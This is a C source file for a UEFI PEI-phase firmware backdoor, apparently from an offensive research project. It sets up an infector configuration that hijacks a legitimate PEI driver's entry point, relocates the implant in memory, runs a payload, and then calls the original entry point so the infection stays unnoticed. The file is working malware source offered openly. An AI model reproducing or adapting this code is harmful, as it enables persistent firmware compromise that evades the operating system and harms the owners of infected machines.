#include <PiPei.h>

#include <Library/PeimEntryPoint.h>
#include <Library/DebugLib.h>
#include <Library/HobLib.h>

#include <Ppi/CpuIo.h>
#include <Ppi/PciCfg.h>
#include <Ppi/MemoryDiscovered.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../payload.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "PeiBackdoor.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

typedef EFI_STATUS (EFIAPI * PEI_ENTRY)(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices
);

EFI_STATUS
BackdoorEntryInfected(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of infected file new entry point
    (UINT64)&BackdoorEntryInfected,

    // RVA address of old entry point (will be set by infector)
    0,

    // virtual address of old entry point (will be set by infector)
    0,

    // backdoor image base (might be set by infector)
    0
};
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {
        if (*(UINT16 *)Base == EFI_IMAGE_DOS_SIGNATURE ||
            *(UINT16 *)Base == EFI_TE_IMAGE_HEADER_SIGNATURE)
        {
            return Base;
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID BackdoorInfoInitialize(VOID)
{    
    BackdoorInfo()->Signature = BACKDOOR_INFO_SIGN;
    BackdoorInfo()->PayloadBase = m_InfectorConfig.BackdoorImageBase;
    BackdoorInfo()->Status = 0;
    BackdoorInfo()->Messages[0] = '\0';
}
//--------------------------------------------------------------------------------------
EFI_STATUS BackdoorImageCallRealEntry(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices)
{
    PEI_ENTRY pEntry = NULL;

    if (m_InfectorConfig.OriginalEntryPointRva != 0 && 
        m_InfectorConfig.BackdoorImageBase)
    {
        // get infected PEI driver image base address
        VOID *DriverImageBase = ImageBaseByAddress(
            (VOID *)(m_InfectorConfig.BackdoorImageBase - DEFAULT_EDK_ALIGN));

        // call original entry point by RVA
        pEntry = (PEI_ENTRY)((UINT8 *)DriverImageBase + 
            m_InfectorConfig.OriginalEntryPointRva);        
    }
    else if (m_InfectorConfig.OriginalEntryPointAddr != 0)
    {
        // call original entry point by address
        pEntry = (PEI_ENTRY)m_InfectorConfig.OriginalEntryPointAddr;           
    }

    if (pEntry)
    {
        return pEntry(FileHandle, ppPeiServices);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS
BackdoorEntryInfected(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices)
{
    // get backdoor image base address
    VOID *Base = ImageBaseByAddress(get_addr());
    if (Base == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    if (m_InfectorConfig.BackdoorImageBase != (UINT64)Base)
    {
        // image base was changed or not set by infector
        m_InfectorConfig.BackdoorImageBase = (UINT64)Base;
    }

    // call real entry point
    BackdoorEntry(FileHandle, ppPeiServices);

    // call original PEI driver image entry point
    return BackdoorImageCallRealEntry(FileHandle, ppPeiServices);
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
BackdoorEntry(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices) 
{
    EFI_STATUS Ret = EFI_SUCCESS;

#if defined(BACKDOOR_DEBUG_MEM)

    // initialize BACKDOOR_INFO structure
    BackdoorInfoInitialize();

#endif

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif    

    DbgMsg(__FILE__, __LINE__, "******************************\r\n\r\n");
    DbgMsg(__FILE__, __LINE__, "  PEI backdoor loaded         \r\n\r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n\r\n");

    DbgMsg(
        __FILE__, __LINE__, "Payload image address is "FPTR"\r\n", 
        m_InfectorConfig.BackdoorImageBase
    );

    DbgMsg(__FILE__, __LINE__, "EFI_PEI_SERVICES is at "FPTR"\r\n", ppPeiServices);

    Ret = Payload(FileHandle, ppPeiServices);

#if defined(BACKDOOR_DEBUG_MEM)

    // report return status
    BackdoorInfo()->Status = Ret;

#endif

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF

